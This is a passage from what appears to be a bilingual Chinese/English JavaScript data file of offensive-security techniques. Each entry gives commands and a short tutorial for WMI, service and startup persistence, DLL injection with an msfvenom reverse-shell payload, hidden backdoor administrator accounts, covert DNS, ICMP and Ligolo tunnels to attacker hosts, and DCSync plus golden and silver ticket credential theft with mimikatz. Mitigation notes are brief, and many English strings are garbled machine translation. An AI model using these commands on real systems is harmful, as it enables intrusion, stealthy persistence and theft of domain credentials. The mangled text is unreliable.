        command: '$filter = New-WmiEventFilter -Name "evil" -Query "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"',
        description: { zh: '创建WMI事件过滤器', en: 'CreateWMIEventFilterTool' },
        platform: 'windows'
      },
      {
        title: { zh: '创建事件消费者', en: 'Create an event consumer' },
        command: '$consumer = New-WmiEventConsumer -Name "evil" -CommandLineTemplate "powershell -e BASE64_CMD"',
        description: { zh: '创建命令行消费者', en: 'Create a command-line event consumer' },
        platform: 'windows'
      },
      {
        title: { zh: '绑定过滤器和消费者', en: 'Bind the filter to the consumer' },
        command: 'New-WmiFilterToConsumerBinding -Filter $filter -Consumer $consumer',
        description: { zh: '绑定触发执行', en: 'bindingTriggerExecute' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'WMI事件订阅可以实现隐蔽的持久化。', en: 'WMI event subscriptions can provide stealthy persistence.' },
      vulnerability: { zh: 'WMI允许创建自动执行的事件。', en: 'WMIAllowCreateAutomaticExecute Event.' },
      exploitation: { zh: '利用流程：1) 创建过滤器 2) 创建消费者 3) 绑定执行', en: 'Exploitation workflow: 1) Create a filter; 2) Create a consumer; 3) Bind and execute' },
      mitigation: { zh: '防御措施：1) 监控WMI事件 2) 审计WMI仓库', en: 'Defenses: 1) Monitor WMI events; 2) Audit the WMI repository' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'persistence-startup',
    name: { zh: '启动文件夹持久化', en: 'Startup Folder Persistence' },
    description: { zh: '通过启动文件夹实现持久化', en: 'throughStartup FolderImplementPersistence' },
    category: { zh: '权限维持', en: 'Persistence' },
    subCategory: { zh: '启动文件夹', en: 'Startup Folder' },
    tags: ['startup', 'persistence', 'windows'],
    prerequisites: [{ zh: '写入权限', en: 'WritePermission' }],
    execution: [
      {
        title: { zh: '当前用户启动文件夹', en: 'currentUsersStartup Folder' },
        command: 'copy evil.lnk "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"',
        description: { zh: '当前用户启动', en: 'currentUsersStart' },
        platform: 'windows'
      },
      {
        title: { zh: '所有用户启动文件夹', en: 'allUsersStartup Folder' },
        command: 'copy evil.lnk "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"',
        description: { zh: '所有用户启动', en: 'allUsersStart' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: '启动文件夹的程序会在用户登录时执行。', en: 'Startup Folder ProgramWill in UsersLoginWhenExecute.' },
      vulnerability: { zh: '启动文件夹可写。', en: 'Startup Folderwritable.' },
      exploitation: { zh: '利用流程：1) 找到启动文件夹 2) 放置恶意文件 3) 等待用户登录', en: 'Exploitation workflow: 1) Find the Startup folder; 2) Plant a malicious file; 3) Wait for user logon' },
      mitigation: { zh: '防御措施：1) 监控启动文件夹 2) 限制写入权限', en: 'Defensemeasures: 1) MonitoringStartup Folder 2) RestrictWritePermission' },
      difficulty: 'beginner'
    }
  },
  {
    id: 'persistence-service',
    name: { zh: '服务持久化', en: 'Service Persistence' },
    description: { zh: '通过创建服务实现持久化', en: 'throughCreateServiceImplementPersistence' },
    category: { zh: '权限维持', en: 'Persistence' },
    subCategory: { zh: '服务', en: 'Service' },
    tags: ['service', 'persistence', 'windows'],
    prerequisites: [{ zh: '管理员权限', en: 'ManagementMemberPermission' }],
    execution: [
      {
        title: { zh: '创建服务', en: 'CreateService' },
        command: 'sc create evilsvc binPath= "cmd /c powershell -e BASE64_CMD" start= auto',
        description: { zh: '创建自启动服务', en: 'Create an auto-start service' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'sc create', explanation: { zh: '创建服务命令', en: 'CreateServiceCommand' } , type: 'command' },
          { part: 'binPath=', explanation: { zh: '服务执行路径', en: 'ServiceExecutePath' } , type: 'parameter' },
          { part: 'start= auto', explanation: { zh: '自动启动', en: 'AutomaticStart' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: '启动服务', en: 'Start Service' },
        command: 'sc start evilsvc',
        description: { zh: '启动服务', en: 'Start Service' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: '服务可以在系统启动时自动执行。', en: 'Servicecan in SystemStartWhenAutomaticExecute.' },
      vulnerability: { zh: '服务可以配置执行任意命令。', en: 'ServicecanConfigurationExecuteArbitraryCommand.' },
      exploitation: { zh: '利用流程：1) 创建服务 2) 配置自动启动 3) 重启触发', en: 'Exploitationworkflow: 1) CreateService 2) ConfigurationAutomaticStart 3) RestartTrigger' },
      mitigation: { zh: '防御措施：1) 监控服务创建 2) 审计服务配置', en: 'Defensemeasures: 1) MonitoringServiceCreate 2) AuditServiceConfiguration' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'persistence-dll-injection',
    name: { zh: 'DLL注入持久化', en: 'DLL Injection Persistence' },
    description: { zh: '通过DLL注入实现持久化', en: 'throughDLL InjectionImplementPersistence' },
    category: { zh: '权限维持', en: 'Persistence' },
    subCategory: { zh: 'DLL注入', en: 'DLL Injection' },
    tags: ['dll', 'injection', 'persistence'],
    prerequisites: [{ zh: '代码执行权限', en: 'CodeExecutePermission' }, { zh: '目标进程', en: 'TargetProcess' }],
    execution: [
      {
        title: { zh: '创建恶意DLL', en: 'CreateMaliciousDLL' },
        command: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f dll > evil.dll',
        description: { zh: '生成恶意DLL', en: 'GenerateMaliciousDLL' },
        platform: 'linux'
      },
      {
        title: { zh: '注入DLL', en: 'InjectionDLL' },
        command: '使用工具如InjectDLL、PowerShell等注入到目标进程',
        description: { zh: '将DLL注入到运行进程', en: 'will DLL Injection to RunProcess' },
        platform: 'windows'
      },
      {
        title: 'AppInit_DLLs',
        command: 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\\evil.dll" /f',
        description: { zh: '通过AppInit_DLLs注入', en: 'throughAppInit_DLLsInjection' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'DLL注入可以将代码注入到其他进程执行。', en: 'DLL Injectioncan will CodeInjection to otherProcessExecute.' },
      vulnerability: { zh: '进程可以加载任意DLL。', en: 'ProcesscanLoadArbitraryDLL.' },
      exploitation: { zh: '利用流程：1) 创建DLL 2) 注入目标进程 3) 执行代码', en: 'Exploitationworkflow: 1) CreateDLL 2) InjectionTargetProcess 3) ExecuteCode' },
      mitigation: { zh: '防御措施：1) 启用CFG 2) 监控DLL加载 3) 使用签名验证', en: 'Defensemeasures: 1) EnableCFG 2) MonitoringDLLLoad 3) UseSignatureVerify' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'persistence-backdoor-user',
    name: { zh: '后门用户', en: 'Backdoor User' },
    description: { zh: '创建后门用户账户', en: 'CreateBackdoor UserAccount' },
    category: { zh: '权限维持', en: 'Persistence' },
    subCategory: { zh: '用户', en: 'Users' },
    tags: ['user', 'backdoor', 'persistence'],
    prerequisites: [{ zh: '管理员权限', en: 'ManagementMemberPermission' }],
    execution: [
      {
        title: { zh: '创建用户', en: 'CreateUsers' },
        command: 'net user backdoor P@ssw0rd /add\nnet localgroup administrators backdoor /add',
        description: { zh: '创建管理员用户', en: 'CreateManagementMemberUsers' },
        platform: 'windows'
      },
      {
        title: { zh: '隐藏用户', en: 'Hidden User' },
        command: 'net user backdoor$ P@ssw0rd /add',
        description: { zh: '创建隐藏用户（$结尾）', en: 'Create a hidden user (ending with $)' },
        platform: 'windows'
      },
      {
        title: { zh: '修改注册表隐藏', en: 'ModifyRegistryHidden' },
        command: 'reg add "HKLM\\SAM\\SAM\\Domains\\Account\\Users\\Names\\backdoor$" /f',
        description: { zh: '通过注册表隐藏用户', en: 'throughRegistryHidden User' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: '创建后门用户可以持久访问系统。', en: 'CreateBackdoor UsercanpersistentAccessSystem.' },
      vulnerability: { zh: '管理员可以创建用户。', en: 'ManagementMembercanCreateUsers.' },
      exploitation: { zh: '利用流程：1) 创建用户 2) 添加到管理员组 3) 隐藏用户', en: 'Exploitationworkflow: 1) CreateUsers 2) Add to Admin Group 3) Hidden User' },
      mitigation: { zh: '防御措施：1) 监控用户创建 2) 定期审计用户列表', en: 'Defenses: 1) Monitor user creation events; 2) Regularly audit the user list' },
      difficulty: 'beginner'
    }
  },
  {
    id: 'persistence-hidden-user',
    name: { zh: '隐藏用户', en: 'Hidden User' },
    description: { zh: '创建隐藏的管理员用户', en: 'CreateHidden ManagementMemberUsers' },
    category: { zh: '权限维持', en: 'Persistence' },
    subCategory: { zh: '隐藏用户', en: 'Hidden User' },
    tags: ['hidden', 'user', 'persistence'],
    prerequisites: [{ zh: 'SYSTEM权限', en: 'SYSTEMPermission' }],
    execution: [
      {
        title: { zh: '创建用户', en: 'CreateUsers' },
        command: 'net user hidden$ P@ssw0rd /add',
        description: { zh: '创建$结尾用户', en: 'Create a user ending with $' },
        platform: 'windows'
      },
      {
        title: { zh: '添加到管理员组', en: 'Add to Admin Group' },
        command: 'net localgroup administrators hidden$ /add',
        description: { zh: '添加管理员权限', en: 'AddManagementMemberPermission' },
        platform: 'windows'
      },
      {
        title: { zh: '注册表隐藏', en: 'RegistryHidden' },
        command: 'reg export "HKLM\\SAM\\SAM\\Domains\\Account\\Users\\000003E9" user.reg\n修改F值\nreg import user.reg',
        description: { zh: '通过注册表完全隐藏', en: 'Fully hidden via registry manipulation' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: '隐藏用户不会在登录界面和用户列表显示。', en: 'Hidden users do not appear on the login screen or in user lists.' },
      vulnerability: { zh: '注册表可以修改用户显示属性。', en: 'RegistrycanModifyUsersDisplayproperty.' },
      exploitation: { zh: '利用流程：1) 创建用户 2) 修改注册表 3) 完全隐藏', en: 'Exploitation workflow: 1) Create a user; 2) Modify the registry; 3) Achieve full concealment' },
      mitigation: { zh: '防御措施：1) 监控注册表修改 2) 深度审计用户', en: 'Defensemeasures: 1) MonitoringRegistryModify 2) depthAuditUsers' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'tunnel-regeorg',
    name: { zh: 'ReGeorg隧道', en: 'ReGeorg Tunnel' },
    description: { zh: '通过Web Shell建立隧道', en: 'throughWeb ShellEstablishtunnel' },
    category: { zh: '隧道代理', en: 'Tunneling & Proxy' },
    subCategory: 'ReGeorg',
    tags: ['tunnel', 'regeorg', 'proxy'],
    prerequisites: [{ zh: 'Web Shell上传', en: 'Web ShellUpload' }, { zh: '支持脚本语言', en: 'Supports scripting languages' }],
    execution: [
      {
        title: { zh: '上传隧道脚本', en: 'UploadtunnelScript' },
        command: '上传tunnel.aspx/tunnel.jsp/tunnel.php到目标Web服务器',
        description: { zh: '上传对应语言的隧道脚本', en: 'Upload the appropriate language tunnel script' },
        platform: 'all'
      },
      {
        title: { zh: '建立隧道', en: 'Establishtunnel' },
        command: 'python reGeorgSocksProxy.py -p 1080 -u http://target/tunnel.aspx',
        description: { zh: '启动SOCKS代理', en: 'StartSOCKS Proxy' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-p 1080', explanation: { zh: '本地监听端口', en: 'LocallisteningPort' } , type: 'parameter' },
          { part: '-u http://target/tunnel.aspx', explanation: { zh: '隧道脚本URL', en: 'tunnelScriptURL' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: '配置代理', en: 'Configure Proxy' },
        command: 'proxychains nmap -sT -Pn target',
        description: { zh: '通过代理扫描', en: 'throughProxyScan' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'ReGeorg通过Web Shell建立SOCKS代理隧道。', en: 'ReGeorgthroughWeb ShellEstablishSOCKS Proxytunnel.' },
      vulnerability: { zh: 'Web服务器可上传执行脚本。', en: 'WebServerCanUploadExecuteScript.' },
      exploitation: { zh: '利用流程：1) 上传隧道脚本 2) 建立隧道 3) 通过代理访问', en: 'Exploitationworkflow: 1) UploadtunnelScript 2) Establishtunnel 3) throughProxyAccess' },
      mitigation: { zh: '防御措施：1) 限制文件上传 2) 监控异常请求', en: 'Defensemeasures: 1) RestrictFile Upload 2) MonitoringExceptionRequest' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'tunnel-ssh-local',
    name: { zh: 'SSH本地转发', en: 'SSH Local Forwarding' },
    description: { zh: 'SSH本地端口转发', en: 'SSHLocalPort Forwarding' },
    category: { zh: '隧道代理', en: 'Tunneling & Proxy' },
    subCategory: 'SSH',
    tags: ['ssh', 'tunnel', 'local'],
    prerequisites: [{ zh: 'SSH访问权限', en: 'SSHAccessPermission' }],
    execution: [
      {
        title: { zh: '本地转发', en: 'LocalForward' },
        command: 'ssh -L 8080:target:80 user@jump',
        description: { zh: '将目标80端口映射到本地8080', en: 'will Target80Portmapping to Local8080' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-L 8080:target:80', explanation: { zh: '本地转发：本地8080->target:80', en: 'LocalForward: Local8080->target:80' } , type: 'parameter' },
          { part: 'user@jump', explanation: { zh: 'SSH跳板机', en: 'SSH jump host' } , type: 'value' }
        ]
      }
    ],
    tutorial: {
      overview: { zh: 'SSH本地转发可以将远程端口映射到本地。', en: 'SSH Local Forwardingcan will RemotePortmapping to Local.' },
      vulnerability: { zh: 'SSH访问可以建立隧道。', en: 'SSHAccesscanEstablishtunnel.' },
      exploitation: { zh: '利用流程：1) 建立SSH连接 2) 配置转发 3) 访问本地端口', en: 'Exploitationworkflow: 1) EstablishSSHConnection 2) ConfigurationForward 3) AccessLocalPort' },
      mitigation: { zh: '防御措施：1) 限制SSH端口转发 2) 监控SSH连接', en: 'Defensemeasures: 1) RestrictSSHPort Forwarding 2) MonitoringSSHConnection' },
      difficulty: 'beginner'
    }
  },
  {
    id: 'tunnel-ssh-remote',
    name: { zh: 'SSH远程转发', en: 'SSH Remote Forwarding' },
    description: { zh: 'SSH远程端口转发', en: 'SSHRemotePort Forwarding' },
    category: { zh: '隧道代理', en: 'Tunneling & Proxy' },
    subCategory: 'SSH',
    tags: ['ssh', 'tunnel', 'remote'],
    prerequisites: [{ zh: 'SSH访问权限', en: 'SSHAccessPermission' }],
    execution: [
      {
        title: { zh: '远程转发', en: 'RemoteForward' },
        command: 'ssh -R 8080:localhost:80 user@jump',
        description: { zh: '将本地80端口映射到远程8080', en: 'will Local80Portmapping to Remote8080' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-R 8080:localhost:80', explanation: { zh: '远程转发：远程8080->本地80', en: 'RemoteForward: Remote8080->Local80' } , type: 'parameter' },
          { part: 'user@jump', explanation: { zh: 'SSH跳板机', en: 'SSH jump host' } , type: 'value' }
        ]
      }
    ],
    tutorial: {
      overview: { zh: 'SSH远程转发可以将本地端口暴露到远程。', en: 'SSH remote forwarding can expose a local port to a remote host.' },
      vulnerability: { zh: 'SSH访问可以建立反向隧道。', en: 'SSH access can be used to establish reverse tunnels.' },
      exploitation: { zh: '利用流程：1) 建立SSH连接 2) 配置反向转发 3) 从远程访问', en: 'Exploitation workflow: 1) Establish SSH connection 2) Configure reverse forwarding 3) Access from remote' },
      mitigation: { zh: '防御措施：1) 限制SSH端口转发 2) GatewayPorts no', en: 'Defensemeasures: 1) RestrictSSHPort Forwarding 2) GatewayPorts no' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'tunnel-ssh-dynamic',
    name: { zh: 'SSH动态转发', en: 'SSH Dynamic Forwarding' },
    description: { zh: 'SSH动态SOCKS代理', en: 'SSH Dynamic SOCKS Proxy' },
    category: { zh: '隧道代理', en: 'Tunneling & Proxy' },
    subCategory: 'SSH',
    tags: ['ssh', 'tunnel', 'socks'],
    prerequisites: [{ zh: 'SSH访问权限', en: 'SSHAccessPermission' }],
    execution: [
      {
        title: { zh: '动态转发', en: 'Dynamic Forwarding' },
        command: 'ssh -D 1080 user@jump',
        description: { zh: '创建SOCKS代理', en: 'CreateSOCKS Proxy' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-D 1080', explanation: { zh: '动态转发，创建SOCKS5代理', en: 'Dynamic forwarding to create a SOCKS5 proxy' } , type: 'parameter' },
          { part: 'user@jump', explanation: { zh: 'SSH跳板机', en: 'SSH jump host' } , type: 'value' }
        ]
      },
      {
        title: { zh: '使用代理', en: 'Using Proxy' },
        command: 'proxychains nmap -sT -Pn target',
        description: { zh: '通过SOCKS代理访问', en: 'throughSOCKS ProxyAccess' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'SSH动态转发创建SOCKS代理，可访问任意目标。', en: 'SSH Dynamic ForwardingCreateSOCKS Proxy, CanAccessArbitraryTarget.' },
      vulnerability: { zh: 'SSH访问可以建立SOCKS代理。', en: 'SSHAccesscanEstablishSOCKS Proxy.' },
      exploitation: { zh: '利用流程：1) 建立SSH连接 2) 创建SOCKS代理 3) 通过代理访问', en: 'Exploitationworkflow: 1) EstablishSSHConnection 2) CreateSOCKS Proxy 3) throughProxyAccess' },
      mitigation: { zh: '防御措施：1) 限制SSH端口转发 2) 监控SSH连接', en: 'Defensemeasures: 1) RestrictSSHPort Forwarding 2) MonitoringSSHConnection' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'tunnel-dns',
    name: { zh: 'DNS隧道', en: 'DNS Tunnel' },
    description: { zh: '通过DNS协议建立隧道', en: 'throughDNSProtocolEstablishtunnel' },
    category: { zh: '隧道代理', en: 'Tunneling & Proxy' },
    subCategory: 'DNS',
    tags: ['dns', 'tunnel', 'covert'],
    prerequisites: [{ zh: 'DNS解析权限', en: 'DNS resolutionPermission' }, { zh: '可控域名', en: 'Controlled domain name' }],
    execution: [
      {
        title: { zh: '使用dnscat2', en: 'Usednscat2' },
        command: 'ruby dnscat2.rb evil.com --dns port=53,domain=evil.com',
        description: { zh: '启动dnscat2服务器', en: 'Startdnscat2Server' },
        platform: 'linux'
      },
      {
        title: { zh: '客户端连接', en: 'ClientConnection' },
        command: 'dnscat2-v0.07-client-win32.exe --dns domain=evil.com --secret SECRET',
        description: { zh: '客户端连接到服务器', en: 'ClientConnection to Server' },
        platform: 'windows'
      },
      {
        title: { zh: '建立隧道', en: 'Establishtunnel' },
        command: 'session -i 1\nlisten 127.0.0.1:1080 10.0.0.1:1080',
        description: { zh: '建立SOCKS隧道', en: 'EstablishSOCKStunnel' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'DNS隧道利用DNS协议传输数据，绕过防火墙。', en: 'DNS tunneling transmits data over the DNS protocol to bypass firewalls.' },
      vulnerability: { zh: 'DNS通常被允许通过防火墙。', en: 'DNSUsually by AllowthroughFirewall.' },
      exploitation: { zh: '利用流程：1) 配置域名 2) 启动服务器 3) 客户端连接', en: 'Exploitationworkflow: 1) ConfigurationDomain name 2) Start ServiceTool 3) ClientConnection' },
      mitigation: { zh: '防御措施：1) 限制DNS查询 2) 监控异常DNS流量', en: 'Defensemeasures: 1) RestrictDNSQuery 2) MonitoringExceptionDNSTraffic' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'tunnel-icmp',
    name: { zh: 'ICMP隧道', en: 'ICMP Tunnel' },
    description: { zh: '通过ICMP协议建立隧道', en: 'throughICMPProtocolEstablishtunnel' },
    category: { zh: '隧道代理', en: 'Tunneling & Proxy' },
    subCategory: 'ICMP',
    tags: ['icmp', 'tunnel', 'covert'],
    prerequisites: [{ zh: 'ICMP允许通过', en: 'ICMPAllowthrough' }, { zh: '管理员权限', en: 'ManagementMemberPermission' }],
    execution: [
      {
        title: { zh: '使用icmptunnel', en: 'Useicmptunnel' },
        command: 'icmptunnel -s 10.0.0.1',
        description: { zh: '服务端启动', en: 'Server-SideStart' },
        platform: 'linux'
      },
      {
        title: { zh: '客户端连接', en: 'ClientConnection' },
        command: 'icmptunnel -c attacker.com',
        description: { zh: '客户端连接', en: 'ClientConnection' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'ICMP隧道利用ICMP Echo包传输数据。', en: 'ICMP tunneling transmits data using ICMP Echo packets.' },
      vulnerability: { zh: 'ICMP通常被允许通过防火墙。', en: 'ICMPUsually by AllowthroughFirewall.' },
      exploitation: { zh: '利用流程：1) 启动服务端 2) 客户端连接 3) 建立隧道', en: 'Exploitation workflow: 1) Start server 2) Client connects 3) Establish tunnel' },
      mitigation: { zh: '防御措施：1) 限制ICMP 2) 监控异常ICMP流量', en: 'Defensemeasures: 1) RestrictICMP 2) MonitoringExceptionICMPTraffic' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'tunnel-ligolo',
    name: { zh: 'Ligolo隧道', en: 'Ligolo Tunnel' },
    description: { zh: 'Ligolo内网穿透工具', en: 'LigoloInternal network tunnelingTools' },
    category: { zh: '隧道代理', en: 'Tunneling & Proxy' },
    subCategory: 'Ligolo',
    tags: ['ligolo', 'tunnel', 'proxy'],
    prerequisites: [{ zh: '可执行代理程序', en: 'CanExecuteProxyProgram' }],
    execution: [
      {
        title: { zh: '启动服务端', en: 'Start the server side' },
        command: 'sudo proxy -selfcert',
        description: { zh: '启动Ligolo代理服务', en: 'StartLigoloProxyService' },
        platform: 'linux'
      },
      {
        title: { zh: '运行代理', en: 'RunProxy' },
        command: 'agent.exe -connect attacker:11601 -ignore-cert',
        description: { zh: '目标机器运行代理', en: 'TargetMachineRunProxy' },
        platform: 'windows'
      },
      {
        title: { zh: '创建隧道', en: 'Createtunnel' },
        command: 'session\nstart',
        description: { zh: '创建隧道接口', en: 'CreatetunnelInterface' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'Ligolo是现代化的内网穿透工具，支持多平台。', en: 'Ligolo is a modern intranet tunneling tool with multi-platform support.' },
      vulnerability: { zh: '可以在目标机器运行代理程序。', en: 'can in TargetMachineRunProxyProgram.' },
      exploitation: { zh: '利用流程：1) 启动服务端 2) 运行代理 3) 创建隧道', en: 'Exploitation workflow: 1) Start server 2) Run agent 3) Create tunnel' },
      mitigation: { zh: '防御措施：1) 监控异常进程 2) 限制出站连接', en: 'Defenses: 1) Monitor anomalous processes 2) Restrict outbound connections' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'dcsync-attack',
    name: { zh: 'DCSync攻击', en: 'DCSync Attack' },
    description: { zh: '模拟域控制器同步获取凭证', en: 'Simulate Domain Controller Replication to Harvest Credentials' },
    category: { zh: '凭证窃取', en: 'Credential Theft' },
    subCategory: { zh: '域渗透', en: 'Domain Penetration' },
    tags: ['dcsync', 'domain-controller', 'mimikatz'],
    prerequisites: [{ zh: '域管理员权限或特定权限', en: 'Domain AdminsPermission or specificPermission' }],
    execution: [
      {
        title: { zh: '使用Mimikatz', en: 'UseMimikatz' },
        command: 'mimikatz # lsadump::dcsync /domain:domain.com /user:Administrator',
        description: { zh: '使用Mimikatz执行DCSync', en: 'UseMimikatzExecuteDCSync' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'lsadump::dcsync', explanation: { zh: 'DCSync模块', en: 'DCSyncModule' } , type: 'command' },
          { part: '/domain:domain.com', explanation: { zh: '目标域名', en: 'TargetDomain name' } , type: 'parameter' },
          { part: '/user:Administrator', explanation: { zh: '目标用户', en: 'TargetUsers' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: '使用impacket', en: 'Useimpacket' },
        command: 'python secretsdump.py -just-dc-user Administrator domain.com/user:password@dc_ip',
        description: { zh: '使用impacket执行DCSync', en: 'UseimpacketExecuteDCSync' },
        platform: 'linux'
      },
      {
        title: { zh: '导出所有哈希', en: 'Exportallhash' },
        command: 'mimikatz # lsadump::dcsync /domain:domain.com /all /csv',
        description: { zh: '导出域内所有用户哈希', en: 'ExportDomainInsideallUsershash' },
        platform: 'windows'
      },
      {
        title: { zh: '权限要求', en: 'Permissionrequirement' },
        command: '需要以下权限之一:\n- Domain Admin\n- Enterprise Admin\n- 复制目录更改权限',
        description: { zh: 'DCSync所需权限', en: 'DCSync Required Permissions' },
        platform: 'all'
      }
    ],
    tutorial: {
      overview: { zh: 'DCSync模拟域控制器复制获取所有凭证。', en: 'DCSync simulates domain controller replication to obtain all credentials.' },
      vulnerability: { zh: '域复制协议缺乏足够的认证验证。', en: 'The domain replication protocol lacks sufficient authentication verification.' },
      exploitation: { zh: '利用流程：1) 获取高权限 2) 执行DCSync 3) 获取所有哈希', en: 'Exploitationworkflow: 1) ObtainHighPermission 2) ExecuteDCSync 3) Obtainallhash' },
      mitigation: { zh: '防御措施：1) 监控DCSync行为 2) 最小权限原则 3) 审计复制权限', en: 'Defensemeasures: 1) MonitoringDCSyncbehavior 2) MinimumPermissionOriginal then 3) AuditCopyPermission' },
      difficulty: 'expert'
    }
  },
  {
    id: 'golden-ticket',
    name: { zh: '黄金票据攻击', en: 'Golden Ticket Attack' },
    description: { zh: '使用krbtgt哈希生成黄金票据', en: 'UsekrbtgthashGenerateGolden Ticket' },
    category: { zh: '凭证窃取', en: 'Credential Theft' },
    subCategory: { zh: '域持久化', en: 'Domain Persistence' },
    tags: ['golden-ticket', 'krbtgt', 'kerberos'],
    prerequisites: [{ zh: 'krbtgt账户哈希', en: 'krbtgtAccounthash' }, { zh: '域SID', en: 'DomainSID' }],
    execution: [
      {
        title: { zh: '获取krbtgt哈希', en: 'Obtainkrbtgthash' },
        command: 'mimikatz # lsadump::lsa /inject /name:krbtgt',
        description: { zh: '获取krbtgt账户哈希', en: 'ObtainkrbtgtAccounthash' },
        platform: 'windows'
      },
      {
        title: { zh: '获取域SID', en: 'ObtainDomainSID' },
        command: 'whoami /user\n或: wmic useraccount get sid',
        description: { zh: '获取域SID', en: 'ObtainDomainSID' },
        platform: 'windows'
      },
      {
        title: { zh: '生成黄金票据', en: 'GenerateGolden Ticket' },
        command: 'mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /ptt',
        description: { zh: '生成并注入黄金票据', en: 'Generate and InjectionGolden Ticket' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'kerberos::golden', explanation: { zh: '黄金票据模块', en: 'Golden TicketModule' } , type: 'command' },
          { part: '/user:Administrator', explanation: { zh: '伪造的用户', en: 'Forge Users' } , type: 'parameter' },
          { part: '/sid:S-1-5-21-xxx', explanation: { zh: '域SID', en: 'DomainSID' } , type: 'parameter' },
          { part: '/krbtgt:HASH', explanation: { zh: 'krbtgt NTLM哈希', en: 'krbtgt NTLMhash' } , type: 'parameter' },
          { part: '/ptt', explanation: { zh: '直接注入内存', en: 'DirectlyInjectionMemory' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: '验证票据', en: 'VerifyTicket' },
        command: 'klist\n或: dir \\\\dc.domain.com\\c$',
        description: { zh: '验证黄金票据是否有效', en: 'VerifyGolden Ticket is WhetherEffective' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: '黄金票据可持久化访问整个域。', en: 'Golden Tickets enable persistent access to the entire domain.' },
      vulnerability: { zh: 'krbtgt密码很少更改，票据有效期长。', en: 'The krbtgt password is rarely changed, giving tickets a long validity period.' },
      exploitation: { zh: '利用流程：1) 获取krbtgt哈希 2) 生成票据 3) 持久化访问', en: 'Exploitationworkflow: 1) Obtainkrbtgthash 2) GenerateTicket 3) PersistenceAccess' },
      mitigation: { zh: '防御措施：1) 定期更换krbtgt密码 2) 监控异常票据 3) 使用PAM', en: 'Defenses: 1) Reset krbtgt password regularly 2) Monitor anomalous tickets 3) Use PAM' },
      difficulty: 'expert'
    }
  },
  {
    id: 'silver-ticket',
    name: { zh: '白银票据攻击', en: 'Silver Ticket Attack' },
    description: { zh: '使用服务账户哈希生成白银票据', en: 'UseServiceAccounthashGenerateSilver Ticket' },
    category: { zh: '凭证窃取', en: 'Credential Theft' },
    subCategory: { zh: '域持久化', en: 'Domain Persistence' },
    tags: ['silver-ticket', 'kerberos', 'service'],
    prerequisites: [{ zh: '服务账户哈希', en: 'ServiceAccounthash' }, { zh: '域SID', en: 'DomainSID' }],
    execution: [
      {
        title: { zh: '获取服务哈希', en: 'Get Serviceshash' },
        command: 'mimikatz # sekurlsa::logonpasswords\n寻找服务账户NTLM哈希',
        description: { zh: '获取服务账户哈希', en: 'Get ServicesAccounthash' },
        platform: 'windows'
      },
      {
        title: { zh: '生成白银票据', en: 'GenerateSilver Ticket' },
        command: 'mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /target:server.domain.com /service:cifs /rc4:HASH /ptt',
        description: { zh: '生成针对特定服务的票据', en: 'GenerateTargeting for specificService Ticket' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: '/target:server.domain.com', explanation: { zh: '目标服务器', en: 'TargetServer' } , type: 'parameter' },
          { part: '/service:cifs', explanation: { zh: '服务类型(CIFS)', en: 'ServiceType(CIFS)' } , type: 'parameter' },
          { part: '/rc4:HASH', explanation: { zh: '服务账户NTLM哈希', en: 'ServiceAccountNTLMhash' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: '常见服务类型', en: 'commonServiceType' },
        command: 'CIFS - 文件共享\nHTTP - Web服务\nLDAP - 目录服务\nMSSQLSvc - SQL服务\nHOST - 远程管理',
        description: { zh: '可伪造的服务类型', en: 'CanForge ServiceType' },
        platform: 'all'
      }
    ],
    tutorial: {
      overview: { zh: '白银票据针对特定服务，比黄金票据更隐蔽。', en: 'Silver Tickets target specific services and are stealthier than Golden Tickets.' },
      vulnerability: { zh: '服务账户密码可被获取。', en: 'ServiceAccountPasswordCan by Obtain.' },
      exploitation: { zh: '利用流程：1) 获取服务哈希 2) 生成票据 3) 访问服务', en: 'Exploitationworkflow: 1) Get Serviceshash 2) GenerateTicket 3) AccessService' },
